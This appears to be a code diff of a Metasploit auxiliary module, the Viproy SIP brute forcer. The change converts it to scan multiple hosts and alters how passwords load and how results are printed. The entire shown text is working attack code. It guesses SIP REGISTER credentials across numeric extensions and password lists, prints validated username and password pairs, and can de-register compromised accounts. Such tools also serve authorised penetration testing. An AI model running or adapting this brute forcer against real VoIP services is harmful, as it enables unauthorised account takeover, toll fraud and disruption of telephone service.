@@ -15,48 +15,43 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Viproy SIP User and Password Brute Forcer',
-      'Version'     => '1',
-      'Description' => 'Brute Force Module for SIP Services',
-      'Author'      => 'fozavci',
-      'License'     => MSF_LICENSE
+        'Name'        => 'Viproy SIP User and Password Brute Forcer',
+        'Version'     => '1',
+        'Description' => 'Brute Force Module for SIP Services',
+        'Author'      => 'fozavci',
+        'License'     => MSF_LICENSE
     )
 
-    deregister_options('RHOSTS')
-
     register_options(
-    [
-      OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
-      OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
-      OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
-      OptString.new('USERNAME',   [ false, "The login username to probe"]),
-      OptString.new('PASSWORD',   [ false, "The login password to probe"]),
-      OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
-      OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
-      OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
-      Opt::RHOST,
-      Opt::RPORT(5060),
-    ], self.class)
+        [
+            OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
+            OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
+            OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
+            OptString.new('USERNAME',   [ false, "The login username to probe"]),
+            OptString.new('PASSWORD',   [ false, "The login password to probe"]),
+            OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
+            OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
+            Opt::RPORT(5060),
+        ], self.class)
 
     register_advanced_options(
-    [
-      Opt::CHOST,
-      Opt::CPORT(5065),
-      OptString.new('DELAY',   [true, 'Delay in seconds',"0"]),
-      OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
-      OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
-      OptBool.new('DEREGISTER', [true, 'De-Register After Successful Login', false]),
-      OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
-      OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
-      OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
-      OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
-      OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
-      OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
-      OptBool.new('DEBUG',   [ false, "Debug Level", false]),
-    ], self.class)
+        [
+            OptString.new('DELAY',   [true, 'Delay in seconds',"0"]),
+            OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
+            OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
+            OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
+            OptBool.new('DEREGISTER', [true, 'De-Register After Successful Login', false]),
+            OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
+            OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
+            OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
+            OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
+            OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
+            OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
+            OptBool.new('DEBUG',   [ false, "Debug Level", false]),
+        ], self.class)
   end
 
-  def run
+  def run_host(dest_addr)
     sockinfo={}
     # Protocol parameters
     sockinfo["proto"] = datastore['PROTO'].downcase
@@ -66,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
     # Socket parameters
     sockinfo["listen_addr"] = datastore['CHOST']
     sockinfo["listen_port"] = datastore['CPORT']
-    sockinfo["dest_addr"] = dest_addr = datastore['RHOST']
+    sockinfo["dest_addr"] = dest_addr
     sockinfo["dest_port"] = datastore['RPORT']
 
     method = datastore['METHOD']
@@ -75,8 +70,7 @@ class Metasploit3 < Msf::Auxiliary
     sipsocket_connect
 
     if datastore['NUMERIC_USERS'] == true
-      passwords = [[datastore['PASSWORD']]]
-      passwords += load_password_vars
+      passwords = load_password_vars
       if passwords == []
         print_error("PASSWORD or password files are not set.")
         return
@@ -110,47 +104,48 @@ class Metasploit3 < Msf::Auxiliary
     Rex.sleep(datastore['DELAY'].to_i)
 
     results = send_register(
-      'login'  	  => true,
-      'user'     	=> user,
-      'password'	=> password,
-      'realm' 	  => realm,
-      'from'    	=> from,
-      'to'    	  => to
+        'login'  	  => true,
+        'user'     	=> user,
+        'password'	=> password,
+        'realm' 	  => realm,
+        'from'    	=> from,
+        'to'    	  => to
     )
 
     context = {
         "method"    => "register",
         "user"      => user,
-        "password"  => password
+        "password"  => password,
+        "print_req" => false
     }
 
-    printresults(results,context) if datastore['DEBUG'] == true
+    if realm == nil
+      ipr=dest_addr
+    else
+      ipr="#{dest_addr}:#{realm}"
+    end
 
     if results["status"] =~ /succeed/
 
-      if datastore['DEBUG'] != true
-        # reporting the validated credentials
-        res=report_creds(user,password,realm,results["status"])
-        #print_good(res.gsub("\tC","C"))
-        print_good("IP:Realm: #{dest_addr}:#{realm}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
-      end
+    printresults(results,context)
+    print_good("#{ipr}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
 
       # Sending de-register
       if datastore['DEREGISTER'] == true
         #De-Registering User
         send_register(
-          'login'  	  => datastore['LOGIN'],
-          'user'     	=> user,
-          'password'	=> password,
-          'realm'     => realm,
-          'from'    	=> from,
-          'to'    	  => to,
-          'expire'    => 0
+            'login'  	  => datastore['LOGIN'],
+            'user'     	=> user,
+            'password'	=> password,
+            'realm'     => realm,
+            'from'    	=> from,
+            'to'    	  => to,
+            'expire'    => 0
         )
       end
     else
       if results["rdata"] !=nil
-        print_status("IP:Realm: #{dest_addr}:#{realm}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
+        vprint_status("#{ipr}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
       else
         vprint_status("No response received from #{dest_addr}")
       end
